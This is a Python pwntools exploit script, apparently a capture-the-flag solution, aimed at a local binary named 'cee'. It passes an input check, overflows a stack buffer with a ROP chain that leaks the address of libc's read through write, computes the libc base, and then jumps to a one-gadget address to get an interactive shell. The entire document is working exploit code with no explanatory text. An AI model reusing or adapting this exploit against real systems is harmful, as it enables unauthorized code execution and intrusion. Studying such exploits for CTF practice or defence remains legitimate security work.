from pwn import *

p = process('./cee')
e = ELF('./cee')
context(arch='amd64',os='linux',endian='little',log_level='debug')
POP_RSI_R15_RET = 0x00400a51
main = 0x400716

def check():
  #p.sendlineafter('exam?\n',"2018-11-15")
  p.sendline("2018-11-15") 
  p.sendline('-1')
  p.sendline('-1')
  p.sendline('-1')

check()
print p.recv()
payload="A"*56
payload+=p64(POP_RSI_R15_RET)
payload+=p64(e.got['read'])
payload += p64(0)
payload+=p64(e.plt['write'])
payload+=p64(main)

p.send(payload)

p.recvuntil("Thank You!!") 

read = u64(p.recv(6)+"\x00"*2)

log.info("read leak :"+hex(read))

libc_base = read - 0xf7250

oneshot = libc_base + 0x45216

p.recvuntil("exam?\n")
#p.sendline("2018-11-15")
check()
print p.recv()
payload1="A"*56
payload1+=p64(oneshot)

p.sendline(payload1)

p.interactive()
